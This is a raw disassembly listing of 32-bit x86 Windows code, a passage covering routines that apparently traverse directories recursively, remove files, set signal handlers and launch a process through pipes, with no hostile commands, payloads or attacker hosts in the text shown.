  404170:	0f b7 84 0c 80 34 00 	movzwl 0x3480(%esp,%ecx,1),%eax
  404177:	00 
  404178:	8d 49 02             	lea    0x2(%ecx),%ecx
  40417b:	66 89 84 0c 6e 04 00 	mov    %ax,0x46e(%esp,%ecx,1)
  404182:	00 
  404183:	66 85 c0             	test   %ax,%ax
  404186:	75 e8                	jne    0x404170
  404188:	8d 9c 24 70 04 00 00 	lea    0x470(%esp),%ebx
  40418f:	8d 4b 02             	lea    0x2(%ebx),%ecx
  404192:	66 8b 03             	mov    (%ebx),%ax
  404195:	83 c3 02             	add    $0x2,%ebx
  404198:	66 85 c0             	test   %ax,%ax
  40419b:	75 f5                	jne    0x404192
  40419d:	2b d9                	sub    %ecx,%ebx
  40419f:	d1 fb                	sar    $1,%ebx
  4041a1:	0f b7 84 5c 6e 04 00 	movzwl 0x46e(%esp,%ebx,2),%eax
  4041a8:	00 
  4041a9:	83 f8 2f             	cmp    $0x2f,%eax
  4041ac:	74 26                	je     0x4041d4
  4041ae:	83 f8 5c             	cmp    $0x5c,%eax
  4041b1:	74 21                	je     0x4041d4
  4041b3:	8d bc 24 70 04 00 00 	lea    0x470(%esp),%edi
  4041ba:	83 c7 fe             	add    $0xfffffffe,%edi
  4041bd:	0f 1f 00             	nopl   (%eax)
  4041c0:	66 8b 47 02          	mov    0x2(%edi),%ax
  4041c4:	8d 7f 02             	lea    0x2(%edi),%edi
  4041c7:	66 85 c0             	test   %ax,%ax
  4041ca:	75 f4                	jne    0x4041c0
  4041cc:	a1 dc 15 42 00       	mov    0x4215dc,%eax
  4041d1:	43                   	inc    %ebx
  4041d2:	89 07                	mov    %eax,(%edi)
  4041d4:	8d bc 24 70 04 00 00 	lea    0x470(%esp),%edi
  4041db:	83 c7 fe             	add    $0xfffffffe,%edi
  4041de:	66 90                	xchg   %ax,%ax
  4041e0:	66 8b 47 02          	mov    0x2(%edi),%ax
  4041e4:	8d 7f 02             	lea    0x2(%edi),%edi
  4041e7:	66 85 c0             	test   %ax,%ax
  4041ea:	75 f4                	jne    0x4041e0
  4041ec:	a1 e0 15 42 00       	mov    0x4215e0,%eax
  4041f1:	89 07                	mov    %eax,(%edi)
  4041f3:	8d 44 24 10          	lea    0x10(%esp),%eax
  4041f7:	50                   	push   %eax
  4041f8:	8d 84 24 74 04 00 00 	lea    0x474(%esp),%eax
  4041ff:	50                   	push   %eax
  404200:	e8 60 a7 00 00       	call   0x40e965
  404205:	83 c4 08             	add    $0x8,%esp
  404208:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40420c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40420f:	0f 84 a2 01 00 00    	je     0x4043b7
  404215:	81 ec 30 02 00 00    	sub    $0x230,%esp
  40421b:	8d 84 24 a0 06 00 00 	lea    0x6a0(%esp),%eax
  404222:	8b fc                	mov    %esp,%edi
  404224:	8d b4 24 40 02 00 00 	lea    0x240(%esp),%esi
  40422b:	b9 8c 00 00 00       	mov    $0x8c,%ecx
  404230:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404232:	53                   	push   %ebx
  404233:	50                   	push   %eax
  404234:	e8 d7 03 00 00       	call   0x404610
  404239:	8d 84 24 48 02 00 00 	lea    0x248(%esp),%eax
  404240:	50                   	push   %eax
  404241:	ff b4 24 48 02 00 00 	push   0x248(%esp)
  404248:	e8 23 a7 00 00       	call   0x40e970
  40424d:	81 c4 40 02 00 00    	add    $0x240,%esp
  404253:	85 c0                	test   %eax,%eax
  404255:	0f 85 50 01 00 00    	jne    0x4043ab
  40425b:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  404260:	b9 8c 00 00 00       	mov    $0x8c,%ecx
  404265:	8d 74 24 10          	lea    0x10(%esp),%esi
  404269:	8d bc 24 40 02 00 00 	lea    0x240(%esp),%edi
  404270:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404272:	b9 d0 15 42 00       	mov    $0x4215d0,%ecx
  404277:	8d 84 24 64 02 00 00 	lea    0x264(%esp),%eax
  40427e:	66 90                	xchg   %ax,%ax
  404280:	66 8b 10             	mov    (%eax),%dx
  404283:	66 3b 11             	cmp    (%ecx),%dx
  404286:	75 1e                	jne    0x4042a6
  404288:	66 85 d2             	test   %dx,%dx
  40428b:	74 15                	je     0x4042a2
  40428d:	66 8b 50 02          	mov    0x2(%eax),%dx
  404291:	66 3b 51 02          	cmp    0x2(%ecx),%dx
  404295:	75 0f                	jne    0x4042a6
  404297:	83 c0 04             	add    $0x4,%eax
  40429a:	83 c1 04             	add    $0x4,%ecx
  40429d:	66 85 d2             	test   %dx,%dx
  4042a0:	75 de                	jne    0x404280
  4042a2:	33 c0                	xor    %eax,%eax
  4042a4:	eb 05                	jmp    0x4042ab
  4042a6:	1b c0                	sbb    %eax,%eax
  4042a8:	83 c8 01             	or     $0x1,%eax
  4042ab:	85 c0                	test   %eax,%eax
  4042ad:	0f 84 df 00 00 00    	je     0x404392
  4042b3:	b8 d4 15 42 00       	mov    $0x4215d4,%eax
  4042b8:	8d 8c 24 64 02 00 00 	lea    0x264(%esp),%ecx
  4042bf:	90                   	nop
  4042c0:	66 8b 11             	mov    (%ecx),%dx
  4042c3:	66 3b 10             	cmp    (%eax),%dx
  4042c6:	75 1e                	jne    0x4042e6
  4042c8:	66 85 d2             	test   %dx,%dx
  4042cb:	74 15                	je     0x4042e2
  4042cd:	66 8b 51 02          	mov    0x2(%ecx),%dx
  4042d1:	66 3b 50 02          	cmp    0x2(%eax),%dx
  4042d5:	75 0f                	jne    0x4042e6
  4042d7:	83 c1 04             	add    $0x4,%ecx
  4042da:	83 c0 04             	add    $0x4,%eax
  4042dd:	66 85 d2             	test   %dx,%dx
  4042e0:	75 de                	jne    0x4042c0
  4042e2:	33 c0                	xor    %eax,%eax
  4042e4:	eb 05                	jmp    0x4042eb
  4042e6:	1b c0                	sbb    %eax,%eax
  4042e8:	83 c8 01             	or     $0x1,%eax
  4042eb:	85 c0                	test   %eax,%eax
  4042ed:	0f 84 9f 00 00 00    	je     0x404392
  4042f3:	33 c0                	xor    %eax,%eax
  4042f5:	8d 94 24 64 02 00 00 	lea    0x264(%esp),%edx
  4042fc:	66 89 84 5c 70 04 00 	mov    %ax,0x470(%esp,%ebx,2)
  404303:	00 
  404304:	8b f2                	mov    %edx,%esi
  404306:	66 8b 02             	mov    (%edx),%ax
  404309:	83 c2 02             	add    $0x2,%edx
  40430c:	66 85 c0             	test   %ax,%ax
  40430f:	75 f5                	jne    0x404306
  404311:	8d bc 24 70 04 00 00 	lea    0x470(%esp),%edi
  404318:	2b d6                	sub    %esi,%edx
  40431a:	83 c7 fe             	add    $0xfffffffe,%edi
  40431d:	0f 1f 00             	nopl   (%eax)
  404320:	66 8b 47 02          	mov    0x2(%edi),%ax
  404324:	83 c7 02             	add    $0x2,%edi
  404327:	66 85 c0             	test   %ax,%ax
  40432a:	75 f4                	jne    0x404320
  40432c:	8b ca                	mov    %edx,%ecx
  40432e:	8d 84 24 70 04 00 00 	lea    0x470(%esp),%eax
  404335:	c1 e9 02             	shr    $0x2,%ecx
  404338:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40433a:	8b ca                	mov    %edx,%ecx
  40433c:	83 e1 03             	and    $0x3,%ecx
  40433f:	f6 44 24 10 10       	testb  $0x10,0x10(%esp)
  404344:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404346:	74 25                	je     0x40436d
  404348:	68 00 10 00 00       	push   $0x1000
  40434d:	50                   	push   %eax
  40434e:	8d 84 24 80 24 00 00 	lea    0x2480(%esp),%eax
  404355:	50                   	push   %eax
  404356:	e8 65 0a 00 00       	call   0x404dc0
  40435b:	8d 84 24 84 24 00 00 	lea    0x2484(%esp),%eax
  404362:	50                   	push   %eax
  404363:	e8 c8 fd ff ff       	call   0x404130
  404368:	83 c4 10             	add    $0x10,%esp
  40436b:	eb 25                	jmp    0x404392
  40436d:	50                   	push   %eax
  40436e:	e8 16 b0 00 00       	call   0x40f389
  404373:	83 c4 04             	add    $0x4,%esp
  404376:	85 c0                	test   %eax,%eax
  404378:	74 18                	je     0x404392
  40437a:	6a 64                	push   $0x64
  40437c:	ff 15 30 00 42 00    	call   *0x420030
  404382:	8d 84 24 70 04 00 00 	lea    0x470(%esp),%eax
  404389:	50                   	push   %eax
  40438a:	e8 fa af 00 00       	call   0x40f389
  40438f:	83 c4 04             	add    $0x4,%esp
  404392:	8d 44 24 10          	lea    0x10(%esp),%eax
  404396:	50                   	push   %eax
  404397:	ff 74 24 10          	push   0x10(%esp)
  40439b:	e8 d0 a5 00 00       	call   0x40e970
  4043a0:	83 c4 08             	add    $0x8,%esp
  4043a3:	85 c0                	test   %eax,%eax
  4043a5:	0f 84 b5 fe ff ff    	je     0x404260
  4043ab:	ff 74 24 0c          	push   0xc(%esp)
  4043af:	e8 8b a5 00 00       	call   0x40e93f
  4043b4:	83 c4 04             	add    $0x4,%esp
  4043b7:	8d 84 24 80 34 00 00 	lea    0x3480(%esp),%eax
  4043be:	50                   	push   %eax
  4043bf:	e8 8d a2 00 00       	call   0x40e651
  4043c4:	8b 8c 24 90 54 00 00 	mov    0x5490(%esp),%ecx
  4043cb:	83 c4 04             	add    $0x4,%esp
  4043ce:	5f                   	pop    %edi
  4043cf:	5e                   	pop    %esi
  4043d0:	5b                   	pop    %ebx
  4043d1:	33 cc                	xor    %esp,%ecx
  4043d3:	e8 8c 36 00 00       	call   0x407a64
  4043d8:	8b e5                	mov    %ebp,%esp
  4043da:	5d                   	pop    %ebp
  4043db:	c3                   	ret
  4043dc:	cc                   	int3
  4043dd:	cc                   	int3
  4043de:	cc                   	int3
  4043df:	cc                   	int3
  4043e0:	53                   	push   %ebx
  4043e1:	56                   	push   %esi
  4043e2:	57                   	push   %edi
  4043e3:	6a 00                	push   $0x0
  4043e5:	ff 74 24 14          	push   0x14(%esp)
  4043e9:	6a 00                	push   $0x0
  4043eb:	e8 40 09 00 00       	call   0x404d30
  4043f0:	6a 00                	push   $0x0
  4043f2:	ff 74 24 24          	push   0x24(%esp)
  4043f6:	8b d8                	mov    %eax,%ebx
  4043f8:	6a 00                	push   $0x0
  4043fa:	e8 31 09 00 00       	call   0x404d30
  4043ff:	8b f8                	mov    %eax,%edi
  404401:	57                   	push   %edi
  404402:	53                   	push   %ebx
  404403:	e8 0d a2 00 00       	call   0x40e615
  404408:	53                   	push   %ebx
  404409:	8b f0                	mov    %eax,%esi
  40440b:	e8 46 58 00 00       	call   0x409c56
  404410:	57                   	push   %edi
  404411:	e8 40 58 00 00       	call   0x409c56
  404416:	83 c4 28             	add    $0x28,%esp
  404419:	8b c6                	mov    %esi,%eax
  40441b:	5f                   	pop    %edi
  40441c:	5e                   	pop    %esi
  40441d:	5b                   	pop    %ebx
  40441e:	c3                   	ret
  40441f:	cc                   	int3
  404420:	56                   	push   %esi
  404421:	57                   	push   %edi
  404422:	6a 00                	push   $0x0
  404424:	ff 74 24 10          	push   0x10(%esp)
  404428:	6a 00                	push   $0x0
  40442a:	e8 01 09 00 00       	call   0x404d30
  40442f:	83 c4 0c             	add    $0xc,%esp
  404432:	8b f8                	mov    %eax,%edi
  404434:	6a 00                	push   $0x0
  404436:	57                   	push   %edi
  404437:	ff 15 20 00 42 00    	call   *0x420020
  40443d:	57                   	push   %edi
  40443e:	8b f0                	mov    %eax,%esi
  404440:	e8 11 58 00 00       	call   0x409c56
  404445:	83 c4 04             	add    $0x4,%esp
  404448:	8b c6                	mov    %esi,%eax
  40444a:	5f                   	pop    %edi
  40444b:	5e                   	pop    %esi
  40444c:	c3                   	ret
  40444d:	cc                   	int3
  40444e:	cc                   	int3
  40444f:	cc                   	int3
  404450:	b8 68 20 00 00       	mov    $0x2068,%eax
  404455:	e8 26 36 00 00       	call   0x407a80
  40445a:	a1 08 c0 42 00       	mov    0x42c008,%eax
  40445f:	33 c4                	xor    %esp,%eax
  404461:	89 84 24 64 20 00 00 	mov    %eax,0x2064(%esp)
  404468:	8b 84 24 6c 20 00 00 	mov    0x206c(%esp),%eax
  40446f:	68 00 10 00 00       	push   $0x1000
  404474:	50                   	push   %eax
  404475:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  404479:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  404480:	00 
  404481:	50                   	push   %eax
  404482:	e8 a9 08 00 00       	call   0x404d30
  404487:	6a 01                	push   $0x1
  404489:	6a 16                	push   $0x16
  40448b:	e8 47 ad 00 00       	call   0x40f1d7
  404490:	6a 01                	push   $0x1
  404492:	6a 02                	push   $0x2
  404494:	e8 3e ad 00 00       	call   0x40f1d7
  404499:	6a 01                	push   $0x1
  40449b:	6a 0f                	push   $0xf
  40449d:	e8 35 ad 00 00       	call   0x40f1d7
  4044a2:	6a 01                	push   $0x1
  4044a4:	6a 15                	push   $0x15
  4044a6:	e8 2c ad 00 00       	call   0x40f1d7
  4044ab:	83 c4 2c             	add    $0x2c,%esp
  4044ae:	c7 44 24 04 0c 00 00 	movl   $0xc,0x4(%esp)
  4044b5:	00 
  4044b6:	8d 44 24 20          	lea    0x20(%esp),%eax
  4044ba:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4044c1:	00 
  4044c2:	c7 44 24 0c 01 00 00 	movl   $0x1,0xc(%esp)
  4044c9:	00 
  4044ca:	50                   	push   %eax
  4044cb:	ff 15 3c 00 42 00    	call   *0x42003c
  4044d1:	b8 01 00 00 00       	mov    $0x1,%eax
  4044d6:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  4044dd:	00 
  4044de:	6a 00                	push   $0x0
  4044e0:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  4044e7:	00 
  4044e8:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
  4044ef:	00 
  4044f0:	c7 44 24 50 01 01 00 	movl   $0x101,0x50(%esp)
  4044f7:	00 
  4044f8:	66 89 44 24 54       	mov    %ax,0x54(%esp)
  4044fd:	e8 3c 67 00 00       	call   0x40ac3e
  404502:	50                   	push   %eax
  404503:	e8 24 9e 00 00       	call   0x40e32c
  404508:	50                   	push   %eax
  404509:	e8 31 a8 00 00       	call   0x40ed3f
  40450e:	6a 01                	push   $0x1
  404510:	89 44 24 68          	mov    %eax,0x68(%esp)
  404514:	e8 25 67 00 00       	call   0x40ac3e
  404519:	50                   	push   %eax
  40451a:	e8 0d 9e 00 00       	call   0x40e32c
  40451f:	50                   	push   %eax
  404520:	e8 1a a8 00 00       	call   0x40ed3f
  404525:	6a 02                	push   $0x2
  404527:	89 44 24 78          	mov    %eax,0x78(%esp)
  40452b:	e8 0e 67 00 00       	call   0x40ac3e
  404530:	50                   	push   %eax
  404531:	e8 f6 9d 00 00       	call   0x40e32c
  404536:	50                   	push   %eax
  404537:	e8 03 a8 00 00       	call   0x40ed3f
  40453c:	83 c4 24             	add    $0x24,%esp
  40453f:	89 44 24 60          	mov    %eax,0x60(%esp)
  404543:	8d 44 24 10          	lea    0x10(%esp),%eax
  404547:	50                   	push   %eax
  404548:	8d 44 24 24          	lea    0x24(%esp),%eax
  40454c:	50                   	push   %eax
  40454d:	6a 00                	push   $0x0
  40454f:	6a 00                	push   $0x0
  404551:	6a 00                	push   $0x0
  404553:	6a 01                	push   $0x1
  404555:	6a 00                	push   $0x0
  404557:	8d 44 24 20          	lea    0x20(%esp),%eax
  40455b:	50                   	push   %eax
  40455c:	ff 15 18 00 42 00    	call   *0x420018
  404562:	50                   	push   %eax
  404563:	8d 84 24 88 00 00 00 	lea    0x88(%esp),%eax
  40456a:	50                   	push   %eax
  40456b:	ff 15 38 00 42 00    	call   *0x420038
  404571:	85 c0                	test   %eax,%eax
  404573:	74 32                	je     0x4045a7
  404575:	6a ff                	push   $0xffffffff
  404577:	ff 74 24 14          	push   0x14(%esp)
  40457b:	ff 15 5c 00 42 00    	call   *0x42005c
  404581:	8d 04 24             	lea    (%esp),%eax
  404584:	50                   	push   %eax
  404585:	ff 74 24 14          	push   0x14(%esp)
  404589:	ff 15 34 00 42 00    	call   *0x420034
  40458f:	8b 04 24             	mov    (%esp),%eax
  404592:	8b 8c 24 64 20 00 00 	mov    0x2064(%esp),%ecx
  404599:	33 cc                	xor    %esp,%ecx
  40459b:	e8 c4 34 00 00       	call   0x407a64
  4045a0:	81 c4 68 20 00 00    	add    $0x2068,%esp
  4045a6:	c3                   	ret
  4045a7:	68 1c 16 42 00       	push   $0x42161c
  4045ac:	68 3c 16 42 00       	push   $0x42163c
  4045b1:	e8 4a d3 ff ff       	call   0x401900
  4045b6:	8b 8c 24 6c 20 00 00 	mov    0x206c(%esp),%ecx
  4045bd:	83 c4 08             	add    $0x8,%esp
  4045c0:	33 cc                	xor    %esp,%ecx
  4045c2:	83 c8 ff             	or     $0xffffffff,%eax
  4045c5:	e8 9a 34 00 00       	call   0x407a64
  4045ca:	81 c4 68 20 00 00    	add    $0x2068,%esp
  4045d0:	c3                   	ret
  4045d1:	cc                   	int3
  4045d2:	cc                   	int3
  4045d3:	cc                   	int3
  4045d4:	cc                   	int3
  4045d5:	cc                   	int3
  4045d6:	cc                   	int3
  4045d7:	cc                   	int3
  4045d8:	cc                   	int3
  4045d9:	cc                   	int3
  4045da:	cc                   	int3
  4045db:	cc                   	int3
  4045dc:	cc                   	int3
  4045dd:	cc                   	int3
  4045de:	cc                   	int3
  4045df:	cc                   	int3
  4045e0:	56                   	push   %esi
  4045e1:	57                   	push   %edi
  4045e2:	6a 00                	push   $0x0
  4045e4:	ff 74 24 10          	push   0x10(%esp)
  4045e8:	6a 00                	push   $0x0
  4045ea:	e8 41 07 00 00       	call   0x404d30
  4045ef:	83 c4 0c             	add    $0xc,%esp
  4045f2:	8b f8                	mov    %eax,%edi
  4045f4:	6a 08                	push   $0x8
  4045f6:	6a 00                	push   $0x0
  4045f8:	57                   	push   %edi
  4045f9:	ff 15 40 00 42 00    	call   *0x420040
  4045ff:	57                   	push   %edi
  404600:	8b f0                	mov    %eax,%esi
  404602:	e8 4f 56 00 00       	call   0x409c56
  404607:	83 c4 04             	add    $0x4,%esp
  40460a:	8b c6                	mov    %esi,%eax
  40460c:	5f                   	pop    %edi
  40460d:	5e                   	pop    %esi
  40460e:	c3                   	ret
  40460f:	cc                   	int3
  404610:	b8 38 12 00 00       	mov    $0x1238,%eax
  404615:	e8 66 34 00 00       	call   0x407a80
  40461a:	a1 08 c0 42 00       	mov    0x42c008,%eax
  40461f:	33 c4                	xor    %esp,%eax
  404621:	89 84 24 34 12 00 00 	mov    %eax,0x1234(%esp)
  404628:	53                   	push   %ebx
  404629:	8b 9c 24 40 12 00 00 	mov    0x1240(%esp),%ebx
  404630:	8d 44 24 28          	lea    0x28(%esp),%eax
  404634:	55                   	push   %ebp
  404635:	8b ac 24 48 12 00 00 	mov    0x1248(%esp),%ebp
  40463c:	b9 8c 00 00 00       	mov    $0x8c,%ecx
  404641:	56                   	push   %esi
  404642:	57                   	push   %edi
  404643:	8d b4 24 54 12 00 00 	lea    0x1254(%esp),%esi
  40464a:	8d 7c 24 10          	lea    0x10(%esp),%edi
  40464e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404650:	b9 d0 15 42 00       	mov    $0x4215d0,%ecx
  404655:	66 8b 10             	mov    (%eax),%dx
  404658:	66 3b 11             	cmp    (%ecx),%dx
  40465b:	75 1e                	jne    0x40467b
  40465d:	66 85 d2             	test   %dx,%dx
  404660:	74 15                	je     0x404677
  404662:	66 8b 50 02          	mov    0x2(%eax),%dx
  404666:	66 3b 51 02          	cmp    0x2(%ecx),%dx
  40466a:	75 0f                	jne    0x40467b
  40466c:	83 c0 04             	add    $0x4,%eax
  40466f:	83 c1 04             	add    $0x4,%ecx
  404672:	66 85 d2             	test   %dx,%dx
  404675:	75 de                	jne    0x404655
  404677:	33 c0                	xor    %eax,%eax
  404679:	eb 05                	jmp    0x404680
  40467b:	1b c0                	sbb    %eax,%eax
  40467d:	83 c8 01             	or     $0x1,%eax
  404680:	85 c0                	test   %eax,%eax
  404682:	0f 84 bc 00 00 00    	je     0x404744
  404688:	b9 d4 15 42 00       	mov    $0x4215d4,%ecx
  40468d:	8d 44 24 34          	lea    0x34(%esp),%eax
  404691:	66 8b 10             	mov    (%eax),%dx
  404694:	66 3b 11             	cmp    (%ecx),%dx
  404697:	75 1e                	jne    0x4046b7
  404699:	66 85 d2             	test   %dx,%dx
  40469c:	74 15                	je     0x4046b3
  40469e:	66 8b 50 02          	mov    0x2(%eax),%dx
  4046a2:	66 3b 51 02          	cmp    0x2(%ecx),%dx
  4046a6:	75 0f                	jne    0x4046b7
  4046a8:	83 c0 04             	add    $0x4,%eax
  4046ab:	83 c1 04             	add    $0x4,%ecx
  4046ae:	66 85 d2             	test   %dx,%dx
  4046b1:	75 de                	jne    0x404691
  4046b3:	33 c0                	xor    %eax,%eax
  4046b5:	eb 05                	jmp    0x4046bc
  4046b7:	1b c0                	sbb    %eax,%eax
  4046b9:	83 c8 01             	or     $0x1,%eax
  4046bc:	85 c0                	test   %eax,%eax
  4046be:	0f 84 80 00 00 00    	je     0x404744
  4046c4:	33 c0                	xor    %eax,%eax
  4046c6:	8d 54 24 34          	lea    0x34(%esp),%edx
  4046ca:	66 89 04 6b          	mov    %ax,(%ebx,%ebp,2)
  4046ce:	8b f2                	mov    %edx,%esi
  4046d0:	66 8b 02             	mov    (%edx),%ax
  4046d3:	83 c2 02             	add    $0x2,%edx
  4046d6:	66 85 c0             	test   %ax,%ax
  4046d9:	75 f5                	jne    0x4046d0
  4046db:	2b d6                	sub    %esi,%edx
  4046dd:	8d 7b fe             	lea    -0x2(%ebx),%edi
  4046e0:	66 8b 47 02          	mov    0x2(%edi),%ax
  4046e4:	83 c7 02             	add    $0x2,%edi
  4046e7:	66 85 c0             	test   %ax,%ax
  4046ea:	75 f4                	jne    0x4046e0
  4046ec:	8b ca                	mov    %edx,%ecx
  4046ee:	c1 e9 02             	shr    $0x2,%ecx
  4046f1:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4046f3:	8b ca                	mov    %edx,%ecx
  4046f5:	83 e1 03             	and    $0x3,%ecx
  4046f8:	f6 44 24 10 10       	testb  $0x10,0x10(%esp)
  4046fd:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4046ff:	74 25                	je     0x404726
  404701:	68 00 10 00 00       	push   $0x1000
  404706:	8d 84 24 44 02 00 00 	lea    0x244(%esp),%eax
  40470d:	53                   	push   %ebx
  40470e:	50                   	push   %eax
  40470f:	e8 ac 06 00 00       	call   0x404dc0
  404714:	8d 84 24 4c 02 00 00 	lea    0x24c(%esp),%eax
  40471b:	50                   	push   %eax
  40471c:	e8 0f fa ff ff       	call   0x404130
  404721:	83 c4 10             	add    $0x10,%esp
  404724:	eb 1e                	jmp    0x404744
  404726:	53                   	push   %ebx
  404727:	e8 5d ac 00 00       	call   0x40f389
  40472c:	83 c4 04             	add    $0x4,%esp
  40472f:	85 c0                	test   %eax,%eax
  404731:	74 11                	je     0x404744
  404733:	6a 64                	push   $0x64
  404735:	ff 15 30 00 42 00    	call   *0x420030
  40473b:	53                   	push   %ebx
  40473c:	e8 48 ac 00 00       	call   0x40f389
  404741:	83 c4 04             	add    $0x4,%esp
  404744:	8b 8c 24 44 12 00 00 	mov    0x1244(%esp),%ecx
  40474b:	5f                   	pop    %edi
  40474c:	5e                   	pop    %esi
  40474d:	5d                   	pop    %ebp
  40474e:	5b                   	pop    %ebx
  40474f:	33 cc                	xor    %esp,%ecx
  404751:	e8 0e 33 00 00       	call   0x407a64
  404756:	81 c4 38 12 00 00    	add    $0x1238,%esp
  40475c:	c3                   	ret
  40475d:	cc                   	int3
  40475e:	cc                   	int3
  40475f:	cc                   	int3
  404760:	8d 44 24 10          	lea    0x10(%esp),%eax
  404764:	50                   	push   %eax
  404765:	6a 00                	push   $0x0
  404767:	ff 74 24 14          	push   0x14(%esp)
  40476b:	ff 74 24 14          	push   0x14(%esp)
  40476f:	ff 74 24 14          	push   0x14(%esp)
  404773:	e8 68 d0 ff ff       	call   0x4017e0
  404778:	ff 70 04             	push   0x4(%eax)
  40477b:	ff 30                	push   (%eax)
  40477d:	e8 02 86 00 00       	call   0x40cd84
  404782:	83 c9 ff             	or     $0xffffffff,%ecx
  404785:	83 c4 1c             	add    $0x1c,%esp
  404788:	85 c0                	test   %eax,%eax
  40478a:	0f 48 c1             	cmovs  %ecx,%eax
  40478d:	c3                   	ret
  40478e:	cc                   	int3
  40478f:	cc                   	int3
  404790:	83 ec 20             	sub    $0x20,%esp
  404793:	53                   	push   %ebx
  404794:	55                   	push   %ebp
  404795:	8b 2d 54 00 42 00    	mov    0x420054,%ebp
  40479b:	56                   	push   %esi
  40479c:	57                   	push   %edi
  40479d:	8b 7c 24 34          	mov    0x34(%esp),%edi
  4047a1:	6a 00                	push   $0x0
  4047a3:	6a 00                	push   $0x0
  4047a5:	6a ff                	push   $0xffffffff
  4047a7:	57                   	push   %edi
  4047a8:	6a 00                	push   $0x0
  4047aa:	68 e9 fd 00 00       	push   $0xfde9
  4047af:	ff d5                	call   *%ebp
  4047b1:	8b f0                	mov    %eax,%esi
  4047b3:	85 f6                	test   %esi,%esi
  4047b5:	75 07                	jne    0x4047be
  4047b7:	68 a0 17 42 00       	push   $0x4217a0
  4047bc:	eb 27                	jmp    0x4047e5
  4047be:	8d 46 01             	lea    0x1(%esi),%eax
  4047c1:	6a 02                	push   $0x2
  4047c3:	50                   	push   %eax
  4047c4:	e8 95 90 00 00       	call   0x40d85e
  4047c9:	83 c4 08             	add    $0x8,%esp
  4047cc:	8b d8                	mov    %eax,%ebx
  4047ce:	56                   	push   %esi
  4047cf:	53                   	push   %ebx
  4047d0:	6a ff                	push   $0xffffffff
  4047d2:	57                   	push   %edi
  4047d3:	6a 00                	push   $0x0
  4047d5:	68 e9 fd 00 00       	push   $0xfde9
  4047da:	ff d5                	call   *%ebp
  4047dc:	85 c0                	test   %eax,%eax
  4047de:	75 14                	jne    0x4047f4
  4047e0:	68 d8 17 42 00       	push   $0x4217d8
  4047e5:	68 c4 17 42 00       	push   $0x4217c4
  4047ea:	e8 11 d1 ff ff       	call   0x401900
  4047ef:	83 c4 08             	add    $0x8,%esp
  4047f2:	33 db                	xor    %ebx,%ebx
  4047f4:	68 d0 16 42 00       	push   $0x4216d0
  4047f9:	ff 15 50 00 42 00    	call   *0x420050
  4047ff:	8b 35 14 00 42 00    	mov    0x420014,%esi
  404805:	8b f8                	mov    %eax,%edi
  404807:	68 dc 16 42 00       	push   $0x4216dc
  40480c:	57                   	push   %edi
  40480d:	ff d6                	call   *%esi
  40480f:	68 ec 16 42 00       	push   $0x4216ec
  404814:	57                   	push   %edi
  404815:	8b e8                	mov    %eax,%ebp
  404817:	ff d6                	call   *%esi
  404819:	8b f0                	mov    %eax,%esi
  40481b:	85 ed                	test   %ebp,%ebp
  40481d:	74 71                	je     0x404890
  40481f:	85 f6                	test   %esi,%esi
  404821:	74 6d                	je     0x404890
  404823:	0f 57 c0             	xorps  %xmm0,%xmm0
  404826:	8d 44 24 10          	lea    0x10(%esp),%eax
  40482a:	0f 11 44 24 10       	movups %xmm0,0x10(%esp)
  40482f:	50                   	push   %eax
  404830:	0f 11 44 24 24       	movups %xmm0,0x24(%esp)
  404835:	c7 44 24 14 20 00 00 	movl   $0x20,0x14(%esp)
  40483c:	00 
  40483d:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  404841:	c7 44 24 18 10 00 00 	movl   $0x10,0x18(%esp)
  404848:	00 
  404849:	ff d5                	call   *%ebp
  40484b:	53                   	push   %ebx
  40484c:	a3 00 c0 42 00       	mov    %eax,0x42c000
  404851:	e8 00 54 00 00       	call   0x409c56
  404856:	a1 00 c0 42 00       	mov    0x42c000,%eax
  40485b:	83 c4 04             	add    $0x4,%esp
  40485e:	83 f8 ff             	cmp    $0xffffffff,%eax
  404861:	74 19                	je     0x40487c
  404863:	68 60 8a 43 00       	push   $0x438a60
  404868:	50                   	push   %eax
  404869:	ff d6                	call   *%esi
  40486b:	85 c0                	test   %eax,%eax
  40486d:	74 0d                	je     0x40487c
  40486f:	5f                   	pop    %edi
  404870:	5e                   	pop    %esi
  404871:	5d                   	pop    %ebp
  404872:	b8 01 00 00 00       	mov    $0x1,%eax
  404877:	5b                   	pop    %ebx
  404878:	83 c4 20             	add    $0x20,%esp
  40487b:	c3                   	ret
  40487c:	6a 00                	push   $0x0
  40487e:	c7 05 00 c0 42 00 ff 	movl   $0xffffffff,0x42c000
  404885:	ff ff ff 
  404888:	e8 13 00 00 00       	call   0x4048a0
  40488d:	83 c4 04             	add    $0x4,%esp
  404890:	5f                   	pop    %edi
  404891:	5e                   	pop    %esi
  404892:	5d                   	pop    %ebp
  404893:	33 c0                	xor    %eax,%eax
  404895:	5b                   	pop    %ebx
  404896:	83 c4 20             	add    $0x20,%esp
  404899:	c3                   	ret
  40489a:	cc                   	int3
  40489b:	cc                   	int3
  40489c:	cc                   	int3
  40489d:	cc                   	int3
  40489e:	cc                   	int3
  40489f:	cc                   	int3
  4048a0:	b8 04 20 00 00       	mov    $0x2004,%eax
  4048a5:	e8 d6 31 00 00       	call   0x407a80
  4048aa:	a1 08 c0 42 00       	mov    0x42c008,%eax
  4048af:	33 c4                	xor    %esp,%eax
  4048b1:	89 84 24 00 20 00 00 	mov    %eax,0x2000(%esp)
  4048b8:	8b 84 24 08 20 00 00 	mov    0x2008(%esp),%eax
  4048bf:	85 c0                	test   %eax,%eax
  4048c1:	75 06                	jne    0x4048c9
  4048c3:	ff 15 08 00 42 00    	call   *0x420008
  4048c9:	6a 00                	push   $0x0
  4048cb:	68 00 10 00 00       	push   $0x1000
